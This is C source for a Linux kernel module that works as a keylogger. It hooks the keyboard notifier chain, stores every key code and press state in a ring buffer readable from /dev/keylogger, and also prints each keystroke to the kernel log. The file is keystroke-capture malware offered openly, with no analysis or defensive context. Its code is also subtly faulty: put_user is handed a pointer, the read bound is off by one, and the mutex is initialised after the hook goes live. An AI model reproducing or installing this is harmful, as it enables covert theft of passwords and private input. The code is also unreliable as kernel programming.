#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/device.h>
#include <linux/keyboard.h>
#include <linux/fs.h>
#include <linux/mutex.h>
#include <asm/uaccess.h>

#define DEVICE_NAME "keylogger"     /* dev name as it appears in /proc/devices and /dev/ */
#define CLASS_NAME  "keylog"
#define BUFFER_LEN 2048

MODULE_LICENSE("GPL");              /* General Public License - required by keyboard_notifier */

static int major;                   /* major number assigned to device driver */
static struct class*  keyloggerClass  = NULL;
static struct device* keyloggerDevice = NULL;

static char dev_buffer[BUFFER_LEN];
static short begin = 0;
static short end = 0;

/* The prototype functions for the character driver */
static int     device_open(struct inode *, struct file *);
static int     device_release(struct inode *, struct file *);
static ssize_t device_read(struct file *, char *, size_t, loff_t *);
static ssize_t device_write(struct file *, const char *, size_t, loff_t *);

static struct file_operations fops =
{
    .read = device_read,
    .write = device_write,
    .open = device_open,
    .release = device_release
};

static int is_device_full(void)
{
    return (end + 1) % BUFFER_LEN == begin;
}

int log_key(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;

    if (code == KBD_KEYCODE)
    {
        if (!is_device_full())
        {
            mutex_lock(&keyloggerDevice->mutex);
            dev_buffer[end] = (char) param->down;
            end = (end + 1) % BUFFER_LEN;
            dev_buffer[end] = (char) (param->value);
            end = (end + 1) % BUFFER_LEN;
            mutex_unlock(&keyloggerDevice->mutex);
            printk(KERN_ALERT "Zapakowal %i %i\n", begin, end);
        }
        printk(KERN_ALERT "KEYLOGGER %i %s\n", param->value, (param->down ? "down" : "up"));
    }

    return NOTIFY_OK;
}

static struct notifier_block nb =
{
    .notifier_call = log_key
};

static int __init keylogger_init(void)
{
    major = register_chrdev(0, DEVICE_NAME, &fops);
    if (major < 0)
    {
        printk(KERN_ALERT "Failed to register character device\n");
        return major;
    }

    keyloggerClass = class_create(THIS_MODULE, CLASS_NAME);
    if (IS_ERR(keyloggerClass))
    {
        unregister_chrdev(major, DEVICE_NAME);
        printk(KERN_ALERT "Failed to register device class\n");
        return PTR_ERR(keyloggerClass);
    }

    keyloggerDevice = device_create(keyloggerClass, NULL, MKDEV(major, 0), NULL, DEVICE_NAME);
    if (IS_ERR(keyloggerDevice))
    {
        class_destroy(keyloggerClass);
        unregister_chrdev(major, DEVICE_NAME);
        printk(KERN_ALERT "Failed to create the device\n");
        return PTR_ERR(keyloggerDevice);
    }

    register_keyboard_notifier(&nb);
    mutex_init(&keyloggerDevice->mutex);
    return 0;
}

static void __exit keylogger_exit(void)
{
    unregister_keyboard_notifier(&nb);
    device_destroy(keyloggerClass, MKDEV(major, 0));
    class_unregister(keyloggerClass);
    class_destroy(keyloggerClass);
    unregister_chrdev(major, DEVICE_NAME);
}

module_init(keylogger_init);
module_exit(keylogger_exit);


static ssize_t device_read(struct file *filp, char *buffer, size_t length, loff_t *offset)
{
    printk(KERN_ALERT "KEYLOGGER read %d\n", major);
    mutex_lock(&keyloggerDevice->mutex);

    unsigned short bytes_read;
    for (bytes_read = 0; begin != end && bytes_read <= length; begin = (begin + 1) % BUFFER_LEN, ++bytes_read)
    {
        /* put_user copies data from the kernel data segment to the user data segment */
        put_user(dev_buffer + begin, buffer + bytes_read);
    }

    mutex_unlock(&keyloggerDevice->mutex);

    return bytes_read;
}

static ssize_t device_write(struct file *filp, const char *buff, size_t len, loff_t *off)
{
    printk(KERN_ALERT "KEYLOGGER write %d\n", major);
    /* Unsupported operation */
    return -EINVAL;
}

static int device_open(struct inode *inode, struct file *file)
{
    printk(KERN_ALERT "KEYLOGGER open %d\n", major);
    return 0;
}

static int device_release(struct inode *inode, struct file *file)
{
    printk(KERN_ALERT "KEYLOGGER release %d\n", major);
    return 0;
}
